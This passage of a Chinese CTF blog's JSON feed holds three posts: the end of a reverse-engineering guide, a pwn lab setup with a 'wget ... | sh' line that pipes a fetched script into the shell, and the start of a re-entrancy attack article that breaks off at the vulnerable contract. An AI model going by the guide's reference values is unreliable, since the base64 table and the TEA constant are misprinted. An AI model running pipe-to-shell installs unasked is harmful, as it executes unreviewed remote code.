Blocker）</p>\n<blockquote>\n<p>双进程保护是一种在调试模式下运行自身程序的方法。这种保护通常存在两个进程，由父进程调试子进程。实际功能的代码运行在子进程中，但是因为子进程已经处于调试状态，无法再使用其他调试器进行附加操作。同时父进程能够控制子进程，通过处理子进程的异常，可以控制子进程正常运行。</p>\n<p>双进程保护技术的难点在于，真正的功能运行在子进程中，若要调试子进程，就需要断开其与父进程之间的链接，但是一旦断开，没有父进程处理子进程的异常，会导致子进程无法正常运行。</p>\n</blockquote>\n<blockquote>\n<p>对于双进程保护的程序，其父进程通常功能单一，因此先针对父进程，了解其处理子进程异常的逻辑，然后调试子程序，使其脱离父进程之后仍能正常运行，最后在对子进程进行调试分析。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"3-关键代码定位\"><a class=\"anchor\" href=\"#3-关键代码定位\">#</a> 3、关键代码定位</h5>\n<p>在一个可执行程序中，汇编代码数量庞大，所以要能够定位出真正需要分析的关键代码，只有找到关键代码之后，才能对关键代码采用的算法进行分析，理清程序功能，最后针对程序功能，写出对应脚本，解出 flag。</p>\n<p>这里给出 3 个常用的关键代码定位法</p>\n<ul>\n<li>\n<p>API 断点法</p>\n<blockquote>\n<p>例如：在获取文本输入时，窗口类程序获取文本的方式主要是通过 GetWindowsText 和 GetDlgItemText 两个 API 来获取。在输出结果时，会弹出对话框，这时调用的 API 通常为 MessageBox。在这些 API 函数中下断点，在调试工具中断下来后，通过栈回溯即可定位到关键代码。</p>\n</blockquote>\n</li>\n<li>\n<p>字符串检索法</p>\n<blockquote>\n<ul>\n<li>\n<p>在 IDA 中</p>\n<p>打开 Strings 子窗口，通过 Ctrl+F 输入想要查找的字符串。</p>\n</li>\n<li>\n<p>在 Ollydbg 中</p>\n<p>通过 Alt+E，可以查看可执行模块，找到主模块，点击右键，选择中文搜索引擎，根据需要搜索 ASCII 或者 UNICODE。</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>辅助工具定位法</p>\n<blockquote>\n<p>针对特定语言或编译器生成的程序，可以用一些辅助工具帮助快速定位案件处理程序的地址。</p>\n<p>如：针对 MFC 程序的 xspy，针对 Delphi 程序的 Dede。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"4-常见加密算法识别\"><a class=\"anchor\" href=\"#4-常见加密算法识别\">#</a> 4、常见加密算法识别</h5>\n<p>在对数据进行变换时，通常会使用一些常用的加密算法，如果能够快速识别出对应的加密算法，就能更快的分析出整个完整的算法，下面给出 CTF 比赛中常用的几种加密算法。</p>\n<ul>\n<li>\n<p><strong>base64</strong></p>\n<blockquote>\n<p>base64 将输入中的每 3 字节（24 比特）按每 6 比特分成一组，编程 4 个小于 64 的索引值，然后通过一个索引表得到 4 个可见字符。</p>\n</blockquote>\n<blockquote>\n<p>索引表为一个 64 字节的字符串：</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>“ABCDEFGHIJKLMNOPQRSTUVMXYZabcdefghijklmnopqrstuvwxyz0123456789<span class=\"token operator\">+</span><span class=\"token operator\">/</span>”</pre></td></tr></table></figure><blockquote>\n<p>如果在代码中发现引用了这个索引表，基本可以确定是 base64。此外，还有一些变种的 base64，主要是改变了索引表。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>TEA</strong></p>\n<blockquote>\n<p>TEA 算法是一种常见的分组加密算法，密钥为 128 比特位，明文为 64 比特位，主要做了 32 轮变换，每轮变换都涉及移位和变换。</p>\n</blockquote>\n<blockquote>\n<p>在 TEA 算法中有一个固定的常数 0x9e3779b9 或者 0x61x88647。</p>\n<p>如果在加密函数中发现了这个常数，基本可以确定是 TEA。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>AES</strong></p>\n<blockquote>\n<p>AES 是一种常见的分组加密算法，加密过程涉及 4 种操作：字节替代、行移位、列混淆、轮密钥加。其中字节替代过程是通过 S 盒完成一个字节到另一个字节的映射。（S 盒的结构自行百度）</p>\n</blockquote>\n<blockquote>\n<p>如果发现程序中有 S 盒或者动态生成了 S 盒，基本可以确定是 AES。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>RC4</strong></p>\n<blockquote>\n<p>RC4 算法属于流加密算法，包括初始化函数和加解密函数。其中初始化代码对某一字符数组进行了初始化赋值，且赋值分别递增，之后又对数组进行了 256 次交换操作。</p>\n</blockquote>\n<blockquote>\n<p>通过识别初始化代码，可以判断是否为 RC4。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>MD5</strong></p>\n<blockquote>\n<p>MD5 信息摘要算法，是一种广泛使用的密码散列函数，会产生一个 128 位（16 字节）的散列值。</p>\n</blockquote>\n<blockquote>\n<p>MD5 加密算法中有个初始化函数 MD5Init ()，会初始化四个 MD5 链接变量的整型参数。分别为 0x67452301、0xefcdab89、0x98badcfe、0x10325476，当看到这四个常数，就可以怀疑是 MD5。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"5-求解flag\"><a class=\"anchor\" href=\"#5-求解flag\">#</a> 5、求解 flag</h5>\n<ul>\n<li>\n<p>直接从内存获取</p>\n<blockquote>\n<p>一些比较简单的题目可以直接查看内存来获取 flag，这种题目只需要在特定的地方下断点，然后查看内存即可获得 flag。</p>\n</blockquote>\n</li>\n<li>\n<p>对算法进行逆变换操作</p>\n<blockquote>\n<p>这类题目要根据程序的输出结果，再分析程序的加密算法，然后编写出对应的逆算法得到 flag。</p>\n</blockquote>\n</li>\n<li>\n<p>线性变换的求解</p>\n<blockquote>\n<p>如果加密算法是一个线性变换，output 的第 i 位只能由 input 的第 i 位决定，通过获取 input [i] 的所有可能输入对应的输出 output [i]，即可求出 input [i]，对于这种变换，可以进行单字符爆破。</p>\n</blockquote>\n</li>\n<li>\n<p>约束求解</p>\n<blockquote>\n<p>如果在 output=convert (input) 之后，需要 output 满足多个约束条件，这种情况下就属于约束求解。</p>\n<p>通常会用到的约束求解器为 z3。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"小结\"><a class=\"anchor\" href=\"#小结\">#</a> 小结</h5>\n<ol>\n<li>使用 strings/file/binwalk/IDA 等静态分析工具收集信息，并根据这些静态信息进行 google/github 搜索。</li>\n<li>研究程序的保护方法，如代码混淆，保护壳及反调试等技术，并设法破除或绕过保护。</li>\n<li>反汇编目标软件，快速定位到关键代码进行分析。</li>\n<li>结合动态调试，验证自己的初期猜想，在分析的过程中理清程序功能。</li>\n<li>针对程序功能，写出对应脚本，求解出 flag。</li>\n</ol>\n<h2 id=\"实战进阶\"><a class=\"anchor\" href=\"#实战进阶\">#</a> 实战 &amp; 进阶</h2>\n<p>一般情况下，大一、大二通过 CTF 比赛学习相应技术，大三开始接触实战。</p>\n<p>根据自己的积累和兴趣，可选取一个方向去深入，例如文件媒体解析类、内核、浏览器内核、IOT、移动端等等。</p>\n<p>下面是一些实战 &amp; 进阶 &amp; 提升的方式</p>\n<ul>\n<li>\n<p>复现漏洞</p>\n</li>\n<li>\n<p>学习漏洞挖掘技术（fuzz)</p>\n</li>\n<li>\n<p>关注顶会议题，尝试寻找攻击面去实践漏洞挖掘</p>\n<ul>\n<li>blcak hat</li>\n<li>poc</li>\n</ul>\n</li>\n<li>\n<p>安全研究漏洞分析</p>\n</li>\n<li>\n<p>甲方</p>\n<ul>\n<li>对内漏洞挖掘</li>\n<li>安全攻防</li>\n</ul>\n</li>\n<li>\n<p>病毒分析</p>\n</li>\n<li>\n<p>纯逆向</p>\n</li>\n<li>\n<p>移动安全、安全加固（移动端)</p>\n</li>\n<li>\n<p>游戏安全</p>\n</li>\n</ul>\n",
            "tags": [
                "pwn",
                "reserve"
            ]
        },
        {
            "id": "https://coldwinds5167.github.io/2021/12/pwn-environment/",
            "url": "https://coldwinds5167.github.io/2021/12/pwn-environment/",
            "title": "pwn环境搭建",
            "date_published": "2021-12-11T15:05:05.000Z",
            "content_html": "<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<h3 id=\"虚拟机安装\"><a class=\"anchor\" href=\"#虚拟机安装\">#</a> 虚拟机安装</h3>\n<ol>\n<li>\n<p>安装 VMware Workstation PRO</p>\n</li>\n<li>\n<p>下载 Ubuntu 镜像</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly91YnVudHUuY29tL2Rvd25sb2FkL2Rlc2t0b3A=\">https://ubuntu.com/download/desktop</span></p>\n<p>多个版本，选择 Ubuntu 20.04.3 LTS 即可</p>\n</blockquote>\n</li>\n<li>\n<p>打开 VMware Workstation PRO，选择创建新的虚拟机。</p>\n<blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%851.png\" alt=\"\" /></p>\n<p>选择下载的 Ubuntu 镜像</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%852.png\" alt=\"\" /></p>\n<p>输入用户名和密码（自定）</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%853.png\" alt=\"\" /></p>\n<p>设置虚拟机安装位置（一般在 D 盘新建一个文件夹专门放虚拟机）</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%854.png\" alt=\"\" /></p>\n<p>后面全部性能设置默认就好</p>\n</blockquote>\n</li>\n<li>\n<p>安装完成后，输入之前设置的密码登录，弹窗全部跳过即可。</p>\n</li>\n</ol>\n<h3 id=\"虚拟机配置\"><a class=\"anchor\" href=\"#虚拟机配置\">#</a> 虚拟机配置</h3>\n<h4 id=\"1换源\"><a class=\"anchor\" href=\"#1换源\">#</a> 1. 换源</h4>\n<blockquote>\n<p>因为 Ubuntu 初始源在美国，从国内访问比较慢，所以这里换成清华源（阿里源）</p>\n<ul>\n<li>\n<p>首先备份一下原文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /etc/apt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> sources.list sources.list.bak</pre></td></tr></table></figure></li>\n<li>\n<p>编辑 sources.list</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit sources.list</pre></td></tr></table></figure></li>\n<li>\n<p>将其中的内容替换为如下内容：(20.04LTS 清华源)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></pre></td></tr></table></figure><p>(20.04LTS 阿里源)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</pre></td></tr></table></figure></li>\n</ul>\n<p>#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-security main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-security main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-updates main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-updates main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-proposed main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-proposed main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-backports main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-backports main restricted universe multiverse</p>\n<pre><code>\n* 更新一下源和已安装的软件包\n\n  ```bash\n  sudo apt update\n  sudo apt upgrade\n</code></pre>\n</blockquote>\n<h4 id=\"2必备软件安装\"><a class=\"anchor\" href=\"#2必备软件安装\">#</a> 2. 必备软件安装</h4>\n<h5 id=\"pip3\"><a class=\"anchor\" href=\"#pip3\">#</a> Pip3</h5>\n<blockquote>\n<p>Python 包管理工具，很重要。</p>\n<p>Ubuntu20 默认安装 python3，故安装 pip3。</p>\n<p>安装后 pip/pip3 都可以使用。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> python3-pip</pre></td></tr></table></figure><h5 id=\"git\"><a class=\"anchor\" href=\"#git\">#</a> Git</h5>\n<blockquote>\n<p>git 的功能是拷贝一个 git 仓库到本地，通常用来下载 Github 上的工具。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">git</span></pre></td></tr></table></figure><blockquote>\n<p>Github 有时候连接不上，这里改一下 host。</p>\n<p>在网站 www.ipaddress.com 查找下面两个域名对应的 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>github.global.ssl.fastly.net</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>github.com</pre></td></tr></table></figure><p>然后修改 host 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit /etc/hosts</pre></td></tr></table></figure><p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/githost.png\" alt=\"\" /></p>\n<p>保存后重启虚拟机即可。</p>\n</blockquote>\n<h5 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> Vim</h5>\n<blockquote>\n<p>文本编辑器，功能很强大，具体使用需要自己下去学习。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">vim</span></pre></td></tr></table></figure><h5 id=\"pwntools\"><a class=\"anchor\" href=\"#pwntools\">#</a> Pwntools</h5>\n<blockquote>\n<p>pwntools 是一个 CTF 框架和漏洞利用开发库，涵盖了 pwn 题利用脚本所需要的各种工具。包括方便的 IO 交互函数，ROP、格式化字符串等利用的自动化工具，shellcode 生成器等等，是目前最好用也是仅有的大型 pwn 利用框架。能节省大量编写脚本的时间。</p>\n<p>极其重要！！！</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3-dev <span class=\"token function\">git</span> libssl-dev libffi-dev build-essential</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> python3 -m pip <span class=\"token function\">install</span> --upgrade pip</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> python3 -m pip <span class=\"token function\">install</span> --upgrade pwntools</pre></td></tr></table></figure><h5 id=\"32位依赖库\"><a class=\"anchor\" href=\"#32位依赖库\">#</a> 32 位依赖库</h5>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> lib32ncurses5-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> lib32z1</pre></td></tr></table></figure><h5 id=\"pwndbgpedagef\"><a class=\"anchor\" href=\"#pwndbgpedagef\">#</a> Pwndbg/Peda/Gef</h5>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n<ul>\n<li>Pwndbg</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/pwndbg/pwndbg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> pwndbg</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>./setup.sh</pre></td></tr></table></figure><ul>\n<li>Peda</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/longld/peda.git~/peda</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"source ~/peda/peda.py\"</span> <span class=\"token operator\">>></span> ~/.gdbinit</pre></td></tr></table></figure><ul>\n<li>Gef</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">wget</span> -q -O-https://github.com/hugsy/gef/raw/master/scripts/gef.sh<span class=\"token operator\">|</span> <span class=\"token function\">sh</span></pre></td></tr></table></figure><blockquote>\n<p>Pwndbg/Peda/Gef 插件可以自由切换，</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit ~/.gdbinit</pre></td></tr></table></figure><p>打开 gdb 环境变量路径文件</p>\n<p>以使用 pwndbg 为例：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> /home/coldwinds/pwndbg/gdbinit.py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#source ~/peda/peda.py</span></pre></td></tr></table></figure><p>需要使用哪一个插件，在其他插件前面加上 <code>#</code> 注释即可</p>\n</blockquote>\n<h4 id=\"3实用软件安装\"><a class=\"anchor\" href=\"#3实用软件安装\">#</a> 3. 实用软件安装</h4>\n<h5 id=\"rop-garget\"><a class=\"anchor\" href=\"#rop-garget\">#</a> ROP-garget</h5>\n<blockquote>\n<p>用来查找程序中一些指令的地址，64 位程序中运用较多。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> pip3 <span class=\"token function\">install</span> capstone</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ROPgadget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> python3 setup.py <span class=\"token function\">install</span></pre></td></tr></table></figure><h5 id=\"one_gadget\"><a class=\"anchor\" href=\"#one_gadget\">#</a> One_gadget</h5>\n<blockquote>\n<p>可以找到 libc 中的 execve ('/bin/sh', NULL, NULL)，在构造其他条件后，利用一个 Gadget 就可以 GetShell。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> ruby</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> gem</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> gem <span class=\"token function\">install</span> one_gadget</pre></td></tr></table></figure><h5 id=\"libcsearcher\"><a class=\"anchor\" href=\"#libcsearcher\">#</a> LibcSearcher</h5>\n<blockquote>\n<p>在开启地址随机化后，通过泄露某一个函数的地址偏移，利用 LibcSearcher 可以搜索到该程序使用的 libc 版本，从而计算出其他函数的地址。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/lieanu/LibcSearcher.git</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> LibcSearcher</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> python3 setup.py develop</pre></td></tr></table></figure><h5 id=\"seccomp-tools\"><a class=\"anchor\" href=\"#seccomp-tools\">#</a> seccomp-tools</h5>\n<blockquote>\n<p>用来读取 seccomp 沙箱规则。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> gcc ruby-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> gem <span class=\"token function\">install</span> seccomp-tools</pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://coldwinds5167.github.io/2021/12/Re-Entrancy/",
            "url": "https://coldwinds5167.github.io/2021/12/Re-Entrancy/",
            "title": "重入攻击",
            "date_published": "2021-12-11T11:56:34.000Z",
            "content_html": "<h1 id=\"重入攻击re-entrancy\"><a class=\"anchor\" href=\"#重入攻击re-entrancy\">#</a> 重入攻击（Re-Entrancy）</h1>\n<h2 id=\"前置\"><a class=\"anchor\" href=\"#前置\">#</a> 前置</h2>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<blockquote>\n<p>​\t\t以太坊智能合约能够调用其他外部合约的代码。而这些合约通常也处理以太币，在调用外部合约时，会要求合约提交外部调用，这些外部调用就可以被攻击者劫持。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t可以通过 fallback 回退函数使合约执行更多的代码，包括回调原合约本身。因此重入攻击有点像间接调用递归函数。</p>\n</blockquote>\n<blockquote>\n<p>​\t\t攻击合约可以回调合约上的一个函数，重新进入合约上的任意位置的代码并执行，如果没有防御措施，合约中的函数可能会被多次执行。</p>\n</blockquote>\n<h3 id=\"大致操作\"><a class=\"anchor\" href=\"#大致操作\">#</a> 大致操作</h3>\n<blockquote>\n<p>​\t\t攻击者在外部地址部署攻击合约，并在该合约写入包含 fallback 回退函数的恶意代码，当合约把以太币发送到该地址时，恶意代码会被激活，这些代码会在没有保护的合约上执行函数。</p>\n</blockquote>\n<h3 id=\"fallback回退函数\"><a class=\"anchor\" href=\"#fallback回退函数\">#</a> Fallback 回退函数</h3>\n<h4 id=\"fallback函数的定义\"><a class=\"anchor\" href=\"#fallback函数的定义\">#</a> fallback 函数的定义</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 无函数名、无函数参数、无返回值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 当要调用的函数找不到时就会触发对 fallback 函数的自动调用。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 由于 Solidity 中提供了编译期检查，所以不能直接通过 Solidity 调用一个不存在的函数。但可以使用 Solidity 的提供的底层函数 address.call 来模拟这一行为。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">FallbackCalled</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"fallback函数的使用\"><a class=\"anchor\" href=\"#fallback函数的使用\">#</a> fallback 函数的使用</h4>\n<blockquote>\n<p>​\t\t使用 send () 函数向某个合约直接转账时，这个行为没有发送任何数据，所以接收合约<strong>总是</strong>会调用 fallback () 函数。</p>\n<p>​\t\t如果要在合约中通过 send () 函数接收以太币，就必须定义 fallback 函数（否则异常），且 fallback 函数必须添加关键字 payable（否则结果将为 false）。</p>\n<p>​\t\t发送以太币一方的合约中的 send () 函数可以不用定义 fallback 函数。</p>\n</blockquote>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h3>\n<p>​\t\t构造一个漏洞合约，用于存放一定数量的以太币。</p>\n<p>​\t\t同时构造一个攻击合约，用于窃取漏洞合约的以太币。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 声明 solidity 版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.23</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 漏洞合约</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">theDAO</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> _credit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token 